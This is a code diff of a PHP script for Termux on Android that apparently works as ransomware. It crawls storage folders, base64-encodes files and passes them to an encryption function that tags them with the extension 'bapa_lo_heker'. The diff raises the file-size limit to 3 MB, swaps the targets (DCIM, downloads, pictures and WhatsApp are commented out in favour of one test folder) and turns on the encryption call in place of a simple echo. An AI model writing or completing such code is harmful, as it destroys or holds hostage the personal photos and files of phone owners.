@@ -2,7 +2,8 @@
 	
 	/* open termux-setup-storage */
 	system('termux-setup-storage');
-
+	$ext = "bapa_lo_heker";
+	
 	function encryptFile($value, $dir){
 
         /* global variabel */
@@ -36,8 +37,8 @@
                 $info = pathinfo($filename);
                 if ($info['extension'] !== $ext) {
 
-                    // not support file 2 mb
-                    if (filesize($filename) < 2000000) {
+                    // not support file 3 mb
+                    if (filesize($filename) < 3000000) {
                         $base = base64_encode(file_get_contents($filename));
                         encryptFile($base, $filename);
                         echo '[+] '. $filename."\n";
@@ -51,10 +52,11 @@
 
     $root = '/data/data/com.termux/files/home/';
     $diskArr = [
-    	'storage/dcim',
-    	'storage/downloads',
-    	'storage/pictures',
-    	'storage/shared/Whatsapp'
+    	// 'storage/dcim',
+    	// 'storage/downloads',
+    	// 'storage/pictures',
+    	// 'storage/shared/Whatsapp',
+    	'storage/ass'
     ];
 
     foreach ($diskArr as $key) {
@@ -63,7 +65,7 @@
         if (is_dir($dir)) {
         	
         	// dir ditemukan
-        	echo "Dir ditemukan => $dir \n";
+        	getFile($dir);
         }else{
         	echo "tidak ketemu";
         }
